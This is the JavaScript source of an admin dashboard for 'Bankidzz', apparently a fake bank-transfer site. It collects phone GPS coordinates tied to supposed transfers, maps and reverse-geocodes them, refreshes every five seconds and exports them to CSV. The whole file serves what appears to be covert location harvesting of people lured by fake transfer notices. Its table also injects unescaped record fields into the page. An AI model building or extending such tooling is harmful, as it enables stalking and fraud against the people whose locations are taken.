// ============================================================
// BANKIDZZ - ADMIN DASHBOARD
// DIBUAT OLEH KAIZEN - VERSION 3.0 (DENGAN HAPUS DATA)
// ============================================================

(function() {
    'use strict';

    // State
    let transfers = [];
    let currentLocation = null;
    let autoRefreshInterval = null;
    let adminToken = sessionStorage.getItem('bankidzz_admin_token') || '';
    let tokenPrompted = false;

    // DOM Elements
    const elements = {
        totalTrans: document.getElementById('totalTrans'),
        verifiedTrans: document.getElementById('verifiedTrans'),
        pendingTrans: document.getElementById('pendingTrans'),
        activeLoc: document.getElementById('activeLoc'),
        transTableBody: document.getElementById('transTableBody'),
        mapPlaceholder: document.getElementById('mapPlaceholder'),
        mapFrame: document.getElementById('mapFrame'),
        locLat: document.getElementById('locLat'),
        locLng: document.getElementById('locLng'),
        locAcc: document.getElementById('locAcc'),
        locTime: document.getElementById('locTime'),
        locAddress: document.getElementById('locAddress'),
        locStatus: document.getElementById('locStatus'),
        openMapsBtn: document.getElementById('openMapsBtn'),
        refreshMapBtn: document.getElementById('refreshMapBtn'),
        refreshTableBtn: document.getElementById('refreshTableBtn'),
        liveTime: document.getElementById('liveTime')
    };

    // ===== LOAD DATA =====
    async function loadData() {
        // Check URL params first (dari share link)
        const urlParams = new URLSearchParams(window.location.search);
        const dataParam = urlParams.get('data');
        
        if (dataParam) {
            try {
                const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
                let allData = JSON.parse(localStorage.getItem('bankidzz_transfers') || '[]');
                allData = allData.filter(t => t.transferId !== decoded.transferId);
                allData.push(decoded);
                localStorage.setItem('bankidzz_transfers', JSON.stringify(allData));
                if (decoded.location) {
                    localStorage.setItem('bankidzz_last_location', JSON.stringify(decoded.location));
                }
                window.history.replaceState({}, document.title, window.location.pathname);
                showAdminNotification('📥 Data dari HP berjaya dimuat!');
            } catch(e) {
                console.warn('[Bankidzz] Failed to parse URL data:', e);
            }
        }

        if (!adminToken && !tokenPrompted) {
            tokenPrompted = true;
            const enteredToken = window.prompt('Masukkan token admin Bankidzz:');
            if (enteredToken) {
                adminToken = enteredToken.trim();
                sessionStorage.setItem('bankidzz_admin_token', adminToken);
            }
        }

        // Utamakan database bersama agar data sama pada semua perangkat admin.
        if (adminToken) {
            try {
                const response = await fetch('/api/locations', {
                    headers: { Authorization: `Bearer ${adminToken}` },
                    cache: 'no-store'
                });

                if (response.status === 401) {
                    adminToken = '';
                    sessionStorage.removeItem('bankidzz_admin_token');
                    showAdminNotification('Token admin tidak valid. Muat ulang untuk mencoba lagi.');
                } else if (!response.ok) {
                    throw new Error('Server gagal memuat data.');
                } else {
                    const result = await response.json();
                    transfers = Array.isArray(result.transfers) ? result.transfers : [];
                    currentLocation = transfers.length && transfers[0].location
                        ? transfers[0].location
                        : null;
                    localStorage.setItem('bankidzz_transfers', JSON.stringify(transfers));
                    if (currentLocation) {
                        localStorage.setItem('bankidzz_last_location', JSON.stringify(currentLocation));
                    }
                    renderStats();
                    renderTable();
                    renderMap();
                    return;
                }
            } catch (error) {
                console.warn('[Bankidzz] Gagal memuat database, memakai data lokal:', error);
            }
        }

        // Fallback lokal jika server sedang tidak dapat dijangkau.
        try {
            const stored = localStorage.getItem('bankidzz_transfers');
            if (stored) {
                transfers = JSON.parse(stored);
            } else {
                transfers = [];
            }
        } catch(e) {
            transfers = [];
        }

        try {
            const loc = localStorage.getItem('bankidzz_last_location');
            if (loc) {
                currentLocation = JSON.parse(loc);
            }
        } catch(e) {}

        renderStats();
        renderTable();
        renderMap();
    }

    // ===== DUMMY DATA =====
    function generateDummyData() {
        const dummy = [];
        const statuses = ['verified', 'pending', 'verified', 'pending', 'verified'];
        const senders = ['Ahmad Bin Abdullah', 'Siti Nurhaliza', 'Mohamad Ali', 'Nurul Izzah', 'Khairul Anuar'];
        const receivers = ['Johnathan Smith', 'Michael Anderson', 'Sarah Johnson', 'David Chen', 'Emma Williams'];

        for (let i = 0; i < 5; i++) {
            const lat = 3.1390 + (Math.random() - 0.5) * 0.1;
            const lng = 101.6869 + (Math.random() - 0.5) * 0.1;
            dummy.push({
                transferId: 'BANKIDZZ-2026-07-25-' + String.fromCharCode(65 + i) + String.fromCharCode(65 + i + 1),
                sender: senders[i % senders.length],
                receiver: receivers[i % receivers.length],
                amount: 'RM ' + (Math.random() * 300000 + 50000).toFixed(2),
                total: 'RM ' + (Math.random() * 300150 + 50150).toFixed(2),
                status: statuses[i % statuses.length],
                location: { lat, lng, accuracy: Math.floor(Math.random() * 50 + 10), timestamp: new Date().toISOString() },
                timestamp: new Date(Date.now() - i * 7200000).toISOString(),
                verifCode: 'A7B9X2K4M1'
            });
        }
        return dummy;
    }

    // ===== RENDER STATS =====
    function renderStats() {
        const total = transfers.length;
        const verified = transfers.filter(t => t.status === 'verified' || t.status === 'completed').length;
        const pending = transfers.filter(t => t.status === 'pending').length;
        const active = transfers.filter(t => t.location && t.status !== 'completed').length;

        elements.totalTrans.textContent = total;
        elements.verifiedTrans.textContent = verified;
        elements.pendingTrans.textContent = pending;
        elements.activeLoc.textContent = active + (currentLocation ? 1 : 0);
    }

    // ===== FORMAT TIME =====
    function formatTime(timestamp) {
        if (!timestamp) return '-';
        const date = new Date(timestamp);
        return date.toLocaleTimeString('ms-MY', { hour12: false }) + ' | ' + 
               date.toLocaleDateString('ms-MY', { day: '2-digit', month: 'short', year: 'numeric' });
    }

    // ===== RENDER TABLE =====
    function renderTable() {
        if (!elements.transTableBody) return;

        if (transfers.length === 0) {
            elements.transTableBody.innerHTML = `
                <tr><td colspan="8" style="text-align:center; padding:40px; color:#555577;">
                    <i class="fas fa-inbox" style="font-size:28px; display:block; margin-bottom:10px;"></i>
                    Tiada transaksi
                </td></tr>
            `;
            return;
        }

        let html = '';
        transfers.slice().reverse().forEach(t => {
            const statusClass = (t.status === 'verified' || t.status === 'completed') ? 'verified' : 'pending';
            const statusText = (t.status === 'verified' || t.status === 'completed') ? 'Disahkan' : 'Menunggu';
            const hasLocation = t.location && t.location.lat && t.location.lng;
            const timeDisplay = t.timestamp ? formatTime(t.timestamp) : '-';

            html += `
                <tr>
                    <td><strong style="font-size:12px;">${t.transferId}</strong></td>
                    <td>${t.sender}</td>
                    <td>${t.receiver}</td>
                    <td>${t.amount || 'RM -'}</td>
                    <td><span class="status-pill ${statusClass}">${statusText}</span></td>
                    <td style="font-size:11px;color:#8888bb;">${timeDisplay}</td>
                    <td>
                        ${hasLocation ? '📍 ' + t.location.lat.toFixed(5) + ', ' + t.location.lng.toFixed(5) : '⏳ Menunggu'}
                    </td>
                    <td>
                        ${hasLocation ? `<button class="btn-view-map" onclick="viewLocation('${t.transferId}')">🗺️ Lihat</button>` : ''}
                        <button class="btn-delete-one" onclick="deleteTransaction('${t.transferId}')">🗑️ Hapus</button>
                    </td>
                </tr>
            `;
        });
        elements.transTableBody.innerHTML = html;

        window.viewLocation = function(id) {
            const transfer = transfers.find(t => t.transferId === id);
            if (transfer && transfer.location) {
                currentLocation = transfer.location;
                renderMap();
                document.querySelector('.maps-section').scrollIntoView({ behavior: 'smooth' });
                showAdminNotification('📍 Menunjukkan lokasi: ' + transfer.transferId);
            }
        };
    }

    // ===== RENDER MAP =====
    function renderMap() {
        if (!currentLocation || !currentLocation.lat || !currentLocation.lng) {
            elements.mapPlaceholder.style.display = 'flex';
            elements.mapFrame.style.display = 'none';
            elements.locLat.textContent = '-';
            elements.locLng.textContent = '-';
            elements.locAcc.textContent = '-';
            elements.locTime.textContent = '-';
            elements.locAddress.textContent = 'Menunggu data lokasi...';
            elements.locStatus.textContent = '⏳ Menunggu';
            elements.locStatus.className = 'loc-status';
            return;
        }

        const { lat, lng, accuracy, timestamp } = currentLocation;

        elements.mapPlaceholder.style.display = 'none';
        elements.mapFrame.style.display = 'block';

        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=16&output=embed`;
        elements.mapFrame.src = mapsUrl;

        elements.locLat.textContent = lat.toFixed(6);
        elements.locLng.textContent = lng.toFixed(6);
        elements.locAcc.textContent = accuracy ? accuracy.toFixed(0) + 'm' : '~';
        elements.locTime.textContent = timestamp ? new Date(timestamp).toLocaleString('ms-MY') : new Date().toLocaleString('ms-MY');

        elements.locStatus.textContent = '✅ Aktif';
        elements.locStatus.className = 'loc-status active';

        // Reverse geocoding dengan fallback
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 8000);

        fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&zoom=16`, {
            signal: controller.signal
        })
        .then(res => res.json())
        .then(data => {
            if (data && data.display_name) {
                elements.locAddress.textContent = data.display_name;
            } else {
                elements.locAddress.textContent = '📍 ' + lat.toFixed(4) + ', ' + lng.toFixed(4);
            }
        })
        .catch(() => {
            elements.locAddress.textContent = '📍 ' + lat.toFixed(4) + ', ' + lng.toFixed(4);
        })
        .finally(() => {
            clearTimeout(timeoutId);
        });

        elements.openMapsBtn.onclick = function() {
            window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
        };
    }

    // ===== DELETE ALL DATA =====
    async function requestDelete(query) {
        if (!adminToken) {
            throw new Error('Token admin belum dimasukkan.');
        }

        const response = await fetch('/api/locations?' + query, {
            method: 'DELETE',
            headers: { Authorization: `Bearer ${adminToken}` }
        });
        const result = await response.json().catch(() => ({}));

        if (!response.ok) {
            throw new Error(result.error || 'Server gagal menghapus data.');
        }
    }

    async function deleteAllData() {
        if (confirm('⚠️ Anda pasti mahu menghapus SEMUA data transaksi? Tindakan ini tidak boleh dipulihkan.')) {
            try {
                await requestDelete('all=true');
            } catch (error) {
                showAdminNotification('❌ ' + error.message);
                return;
            }

            localStorage.removeItem('bankidzz_transfers');
            localStorage.removeItem('bankidzz_last_location');
            localStorage.removeItem('bankidzz_admin_share_url');
            localStorage.removeItem('bankidzz_last_payload');
            transfers = [];
            currentLocation = null;
            renderStats();
            renderTable();
            renderMap();
            showAdminNotification('🗑️ Semua data transaksi telah dihapuskan.');
            console.log('[Bankidzz] All data deleted');
        }
    }

    // ===== DELETE SINGLE TRANSACTION =====
    async function deleteTransaction(id) {
        if (confirm(`⚠️ Hapus transaksi ${id}?`)) {
            try {
                await requestDelete('id=' + encodeURIComponent(id));
            } catch (error) {
                showAdminNotification('❌ ' + error.message);
                return;
            }

            transfers = transfers.filter(t => t.transferId !== id);
            currentLocation = transfers.length && transfers[0].location
                ? transfers[0].location
                : null;
            localStorage.setItem('bankidzz_transfers', JSON.stringify(transfers));
            if (currentLocation) {
                localStorage.setItem('bankidzz_last_location', JSON.stringify(currentLocation));
            } else {
                localStorage.removeItem('bankidzz_last_location');
            }

            await loadData();
            showAdminNotification('🗑️ Transaksi ' + id + ' dihapuskan.');
        }
    }

    window.deleteTransaction = deleteTransaction;

    // ===== EXPORT CSV =====
    function exportData() {
        if (!transfers.length) {
            showAdminNotification('Tiada data untuk diexport.');
            return;
        }

        const escapeCsv = value => `"${String(value ?? '').replace(/"/g, '""')}"`;
        const rows = [
            ['ID Rujukan', 'Pengirim', 'Penerima', 'Jumlah', 'Status', 'Latitud', 'Longitud', 'Ketepatan', 'Masa'],
            ...transfers.map(item => [
                item.transferId,
                item.sender,
                item.receiver,
                item.amount,
                item.status,
                item.location?.lat ?? '',
                item.location?.lng ?? '',
                item.location?.accuracy ?? '',
                item.location?.timestamp ?? item.timestamp ?? ''
            ])
        ];
        const csv = '\uFEFF' + rows.map(row => row.map(escapeCsv).join(',')).join('\r\n');
        const url = URL.createObjectURL(new Blob([csv], { type: 'text/csv;charset=utf-8' }));
        const link = document.createElement('a');
        link.href = url;
        link.download = `bankidzz-transaksi-${new Date().toISOString().slice(0, 10)}.csv`;
        document.body.appendChild(link);
        link.click();
        link.remove();
        URL.revokeObjectURL(url);
        showAdminNotification('Data berjaya diexport.');
    }

    // ===== CLOCK =====
    function updateClock() {
        const now = new Date();
        elements.liveTime.textContent = now.toLocaleTimeString('ms-MY', { hour12: false });
    }

    // ===== ADMIN NOTIFICATION =====
    function showAdminNotification(msg) {
        const div = document.createElement('div');
        div.style.cssText = `
            position: fixed; bottom: 30px; right: 30px;
            background: #12122a; color: #fff; padding: 14px 24px;
            border-radius: 14px; border: 1px solid rgba(255,215,0,0.15);
            box-shadow: 0 15px 40px rgba(0,0,0,0.5);
            font-size: 13px; font-weight: 500;
            z-index: 9999; animation: slideUp 0.4s ease;
            max-width: 400px;
        `;
        div.textContent = msg;
        document.body.appendChild(div);
        setTimeout(() => {
            div.style.opacity = '0';
            div.style.transition = 'opacity 0.5s';
            setTimeout(() => div.remove(), 500);
        }, 4000);
    }

    // ===== REFRESH =====
    function refreshAll() {
        loadData();
        showAdminNotification('🔄 Data telah dikemas kini');
    }

    // ===== BROADCAST CHANNEL LISTENER =====
    function setupBroadcastListener() {
        try {
            const channel = new BroadcastChannel('bankidzz_sync_channel');
            channel.onmessage = function(event) {
                if (event.data && event.data.type === 'NEW_LOCATION') {
                    console.log('[Bankidzz] Received broadcast:', event.data.payload);
                    loadData();
                    showAdminNotification('📡 Data baru dari HP!');
                }
            };
            console.log('[Bankidzz] Broadcast listener active');
        } catch(e) {
            console.warn('[Bankidzz] BroadcastChannel not supported:', e);
        }
    }

    // ===== EVENT LISTENERS =====
    elements.refreshMapBtn.addEventListener('click', refreshAll);
    elements.refreshTableBtn.addEventListener('click', refreshAll);

    // Delete all button
    const deleteBtn = document.getElementById('deleteAllBtn');
    if (deleteBtn) {
        deleteBtn.addEventListener('click', deleteAllData);
    }

    const exportBtn = document.getElementById('exportBtn');
    if (exportBtn) {
        exportBtn.addEventListener('click', exportData);
    }

    // Storage changes
    window.addEventListener('storage', function(e) {
        if (e.key === 'bankidzz_transfers' || e.key === 'bankidzz_last_location') {
            loadData();
        }
    });

    // ===== INIT =====
    loadData();
    updateClock();
    setupBroadcastListener();
    setInterval(updateClock, 1000);
    setInterval(loadData, 5000); // Refresh every 5 seconds for real-time

    console.log('[Bankidzz] Admin dashboard ready');
    console.log('[Bankidzz] Transfers loaded:', transfers.length);

})();
